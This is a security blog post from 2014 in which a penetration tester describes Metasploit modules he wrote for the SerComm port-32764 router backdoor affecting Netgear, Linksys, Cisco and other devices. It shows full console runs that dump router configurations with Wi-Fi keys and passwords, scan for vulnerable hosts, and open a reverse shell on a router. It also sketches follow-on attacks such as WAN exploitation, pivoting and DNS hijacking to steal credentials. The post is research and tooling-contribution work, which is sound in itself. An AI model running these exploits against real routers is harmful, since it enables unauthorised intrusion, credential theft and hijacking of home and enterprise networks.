---
layout: post
title: "Backdoor Modules for Netgear, Linksys, and Other Routers"
date: "2014-01-13"
comments: true
categories: 
 - security
 - hacking
 - metasploit
 - exploit
 - linux
 - mips
---

{% img left /images/backdoor_all_the_routers.jpg %}

A week or so ago, I read the news of a new backdoor on several devices, including those made by [Belkin](http://www.belkin.com/), [Cisco](http://www.cisco.com/), [NetGear](http://www.netgear.com), [Linksys](http://www.linksys.com), and several others. A list of what seems to be affected devices can be found [here](http://wikidevi.com/w/index.php?title=Special%3AAsk&q=%5B%5BManuf%3A%3ASerComm%5D%5D+%5B%5BGlobal+type%3A%3A~embedded*%5D%5D&po=%3FFCC+ID%0D%0A%3FFCC+approval+date%3DFCC+date%0D%0A%3FEstimated+date+of+release%3DEst.+release+date%0D%0A%3FEmbedded+system+type%0D%0A%3FCPU1+brand%0D%0A%3FCPU1+model%3DCPU1+mdl.%0D%0A&eq=yes&p%5Bformat%5D=broadtable&sort_num=&order_num=ASC&p%5Blimit%5D=500&p%5Boffset%5D=&p%5Blink%5D=all&p%5Bsort%5D=&p%5Bheaders%5D=show&p%5Bmainlabel%5D=&p%5Bintro%5D=&p%5Boutro%5D=&p%5Bsearchlabel%5D=%25E). [Eloi Vanderbeken](https://twitter.com/elvanderb), who posted his findings on [GitHub](https://github.com/elvanderb/TCP-32764) made the original discovery. He also wrote a useful python proof-of-concept exploit, which allowed command injection, but I wanted [Metasploit](http://www.metasploit.com) integration.

<!-- more -->

After playing with the proof-of-concept, I realized how powerful this backdoor could be. As I'm doing penetration tests for large enterprises, I'm still amazed that I find small consumer-grade routers all the time. With this backdoor, however, I could gain leverage into certain networks, gain credentials, or all kinds of other fun. That's where all my learning started.

<div style="clear:both;"></div>

## Configuration Dump Module

So the first module I wrote, with the help of [juan-](https://twitter.com/_juan_vazquez_), was to dump the configuration of the device's nvram. This is useful to an attacker for a couple reasons:

1. It contains clear-text passwords to the device, which can often be used to login to the remote management console.
2. In case the device gets messed up from attacking it, all the configuration values can be restored at a later time from the dump.
3. It contains passwords, sweet passwords! People re-use their passwords everywhere, and you now have valid passwords.
4. Did I mention the passwords?

Below is a demonstration of the module running. Note the wireless SSID, keys, and additional credentials being uncovered, without having to supply any credentials:

```
➜  ~  msfcli auxiliary/admin/misc/sercomm_dump_config RHOST=192.168.1.1 E
[*] Initializing modules...
RHOST => 192.168.1.1
[*] 192.168.1.1:32764 - Attempting to connect and check endianess...
[+] 192.168.1.1:32764 - Big Endian device found...
[*] 192.168.1.1:32764 - Attempting to connect and dump configuration...
[*] 192.168.1.1:32764 - Router configuration dump stored in: /Users/mandreko/.msf4/loot/20140113231717_default_192.168.1.1_router.config_104290.txt
[*] 192.168.1.1:32764 - Wifi SSID: Netgear15
[*] 192.168.1.1:32764 - Wifi Key 1: 2A17B75F3D
[*] 192.168.1.1:32764 - Wifi Key 2: C65EFCF158
[*] 192.168.1.1:32764 - Wifi Key 3: 3066C6DDE6
[*] 192.168.1.1:32764 - Wifi Key 4: 1F397B65CA
[*] 192.168.1.1:32764 - HTTP Web Management: User: admin Pass: password
[*] 192.168.1.1:32764 - PPPoE: User: mandreko_dsl Pass: isreallysecure1
[*] 192.168.1.1:32764 - PPPoA: User: mandreko_dsl Pass: isreallysecure1
[*] Auxiliary module execution completed
```

Just tonight, I found that in some of the refactoring we did, the credential collection actually broke, so I made a [pull-request](https://github.com/rapid7/metasploit-framework/pull/2878) to fix it (in case anyone wants to try it before it's merged to trunk). The above output was using the newer code.

## The Scanner Module

So we can dump the nvram configuration of a device. But what good is that if you're unable to find vulnerable devices on the network? In came module number two, the scanner, which could scan all sorts of network ranges. In the below sample, I scanned my test network for the vulnerability, and it found my device, and detected the endianness it was communicating over. You see, MIPS, unlike x86, which is always little endian, can be big or little endian, depending on the processor. Some can even be both, I'm told. However, you need to know which, to know how to communicate with the device. You can start to see how learning MIPS was going to be fun.

```
➜  ~  msfcli auxiliary/scanner/misc/sercomm_backdoor_scanner RHOSTS=192.168.1.0/24 THREADS=64 E
[*] Initializing modules...
RHOSTS => 192.168.1.0/24
THREADS => 64
[+] 192.168.1.1:32764 - Possible backdoor detected - Big Endian
[*] Scanned 036 of 256 hosts (014% complete)
[*] Scanned 058 of 256 hosts (022% complete)
[*] Scanned 083 of 256 hosts (032% complete)
[*] Scanned 105 of 256 hosts (041% complete)
[*] Scanned 129 of 256 hosts (050% complete)
[*] Scanned 157 of 256 hosts (061% complete)
[*] Scanned 196 of 256 hosts (076% complete)
[*] Scanned 205 of 256 hosts (080% complete)
[*] Scanned 233 of 256 hosts (091% complete)
[*] Scanned 256 of 256 hosts (100% complete)
[*] Auxiliary module execution completed
```

## The journey to an exploit

So the first two modules really didn't take a long time to write. The scanner for example, was all of 30 minutes, since [Metasploit](http://www.metasploit.com) has so many nice mix-ins, and libraries already available. The bulk of my last week and a half was spent learning MIPS, and how to generate working payloads. Let me take you on my journey...

Initially, I tried using the payloads in Metasploit, since they've recently added MIPSBE and MIPSLE (big endian and little endian respectively). However, on my testing device, none of the payloads would work. I figured that it would probably be pretty easy to compile for MIPS based devices, since people do ARM all the time with iOS and Android development. Boy was I wrong. I spent 3 days trying to get a working toolchain. I installed the [uclibc Buildroot](http://buildroot.uclibc.org/) toolchain, and found that it's documentation was a bit hard to decipher for a newbie like me. I tried using [Sourcery Codebench](http://www.mentor.com/embedded-software/sourcery-tools/sourcery-codebench/editions/lite-edition/), but again was foiled, because I couldn't target the correct MIPS processors. Eventually I was reading about using [Gentoo](http://www.gentoo.org) with its "crossdev" package. 

After a day of compiling, I had a working base image. From there, I installed crossdev per the documentation. Additionally, I had it create cross-compilers for my MIPS target. (This took several hours to figure out how to get right) In case anyone wants it, this worked for me:

```
# emerge crossdev
# CBUILD=x86_64-pc-linux-gnu CHOST=x86_64-pc-linux-gnu CTARGET=mips-pc-linux-uclibc USE=-nptl crossdev --target mips-pc-linux-uclibc --without-headers
```

Amazing! I could build executables! I made a simple HelloWorld app, and compiled it. It then ran on my test device. I was in business. I just had to figure out how to make a new template in Metasploit, which was going to be no fun at all.

I started talking with [juan-](https://twitter.com/_juan_vazquez_), and I mentioned that my exploit module would now upload the binary payload, but would never run, giving all sorts of random errors. However, if I manually ran 'msfpayload', and uploaded the output, it would work. For some reason I had never tried this, because I do things the hard way sometimes. When we were talking, something I said apparently made him think about it. He came back, and told me he found something. Intrigued, I asked for more information, and he showed me a typo in the core libraries that he then made into a [pull-request](https://github.com/rapid7/metasploit-framework/pull/2849/files). It was a simple mistake, which was probably looked over several times. The  MIPSBE payloads were being encoded with a MIPSLE encoder, which just messed up everything. 

After he merged the pull request, the skies turned blue, and a little rainbow appeared. Payloads were being generated in my module successfully, and giving me shells. Then, I realized that all the time I spent building a [Gentoo](http://www.gentoo.org) crossdev environment, and installing all kinds of tools were pretty much wasted, since it was all just due to a single character typo. On the bright side, the time wasn't really wasted, as I did learn a _lot_ about MIPS, since I was starting to read on shellcoding too.

# The smell of fresh shells in the morning

So after all that time messing with MIPS and [Metasploit](http://www.metasploit.com) ruby code, I had something working, which would actually get a shell. However, as I quickly learned over this past weekend, I forgot to account for little endian devices on the exploit. I had even written code to detect the endianness on the scanner and config dump modules, but somehow on the important command injection vulnerability, had only tested on big endian. I came clean with [juan-](https://twitter.com/_juan_vazquez_), and told him to expect yet another pull request. He was able to make a quick fix, to get the module working for the next Pro release. I then worked to put together a new pull-request to add the little endian values.

During my testing over several devices, however, I found that sometimes devices that would talk to me using big endian, would sometimes require little endian payloads, and vice versa. It was odd, and I can't explain it, but they did. So I added several new targets to my exploit, for specific devices, as well as 2 generic ones. As I get ahold of additional devices (or anyone else for that matter), the code will be updated to reflect those new values. Those changes will hopefully be merged into the trunk soon, but for now, the code can be accessed [here](https://github.com/rapid7/metasploit-framework/pull/2874).

To demonstrate this bug, I have exploited a NetGear WAP4410N device:

```
➜  ~  msfconsole -r wap4410n.rc
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %  %%%%%%%%   %%%%%%%%%%% http://metasploit.pro %%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%
%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%
%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%
%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%
%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


       =[ metasploit v4.9.0-dev [core:4.9 api:1.0] ]
+ -- --=[ 1251 exploits - 681 auxiliary - 201 post ]
+ -- --=[ 328 payloads - 32 encoders - 8 nops      ]
+ -- --=[ Answer Q's about Metasploit and win a WiFi Pineapple Mk5   ]
+ -- --=[ http://bit.ly/msfsurvey (Expires Wed Jan 22 23:59:59 2014) ]

[*] Processing wap4410n.rc for ERB directives.
resource (wap4410n.rc)> use exploit/linux/misc/sercomm_exec
resource (wap4410n.rc)> set target 2
target => 2
resource (wap4410n.rc)> set payload linux/mipsbe/shell_reverse_tcp
payload => linux/mipsbe/shell_reverse_tcp
resource (wap4410n.rc)> set rhost 192.168.1.1
rhost => 192.168.1.1
resource (wap4410n.rc)> set lhost 192.168.1.136
lhost => 192.168.1.136
msf exploit(sercomm_exec) > show options

Module options (exploit/linux/misc/sercomm_exec):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST  192.168.1.1      yes       The target address
   RPORT  32764            yes       The target port


Payload options (linux/mipsbe/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.136    yes       The listen address
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   2   Cisco WAP4410N


msf exploit(sercomm_exec) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Generic Linux MIPS Big Endian
   1   Generic Linux MIPS Little Endian
   2   Cisco WAP4410N
   3   Honeywell WAP-PL2 IP Camera
   4   Netgear DG834
   5   Netgear DG834G
   6   Netgear DG834PN
   7   Netgear DGN1000
   8   Netgear DSG835
   9   Netgear WPNT834


msf exploit(sercomm_exec) > exploit

[*] Started reverse handler on 192.168.1.136:4444
[*] Command shell session 1 opened (192.168.1.136:4444 -> 192.168.1.1:2817) at 2014-01-14 00:33:02 -0500
[*] Command Stager progress - 100.00% done (1415/1415 bytes)

ls -al /
drwxrwxrwx    8 0        0               0 var
drwxr-xr-x    7 0        0              81 usr
drwxrwxrwx    4 0        0               0 tmp
drwxr-xr-x    2 0        0             217 sbin
drwxr-xr-x    2 0        0              36 root
dr-xr-xr-x   47 0        0               0 proc
drwxr-xr-x    2 0        0              23 lost+found
drwxr-xr-x    3 0        0             742 lib
drwxr-xr-x    6 0        0             352 etc
drwxr-xr-x    3 0        0             403 dev
drwxr-xr-x    2 0        0             323 bin
drwxr-xr-x   13 0        0             119 ..
drwxr-xr-x   13 0        0             119 .
```

At this point, command injection has been turned into a fully-fledged shell. As [egyp7](https://twitter.com/egyp7) says, "I love shells".

## The scary part

So here you've seen how you can take a router, and get a shell on it. However the truly scary part is that several of these devices are listening on their WAN interface! That means a remote attacker can exploit your vulnerable router, and start mapping the inside of your network. Some devices support an SSH server, which you could then connect into, and make a dynamic socks proxy, or just forward ports. You already know the username and password to the SSH server, since you dumped all the passwords before, right? 

Another attack could be to simply change the router's DNS servers, so that when clients connect, it serves them with an evil DNS server, making all your sites go to a remote server, which then transparently steals your credentials. 

You can go all tin-foil hat on this, and have some real fun. However, in the long run, I accomplished my goal, and now can compromise many of those devices I see on penetration tests, which really shouldn't belong in the enterprise, and finally have something to back it up with, other than, "it says 'Home' on the box..."

## Conclusion

This was a really fun exercise, and taught me a lot about MIPS. This is also now one of my more favorite contributions.

In the near future, it sounds like there are going to be staged payloads for MIPS, so you don't have to run the big un-staged ones. As more and more vulnerabilities start popping up on these "unconventional computers", we'll see more and more framework around exploiting them. I for one am excited.

Additionally, if you have any access to a vulnerable device, which isn't currently a target in the exploit module, hit me up. I'd love to get more devices added, without buying 100 routers.

Lastly, I'd like to personally thank [juan-](https://twitter.com/_juan_vazquez_). Without your help, these code contributions would have been much lower in quality, if existing at all. You rock.
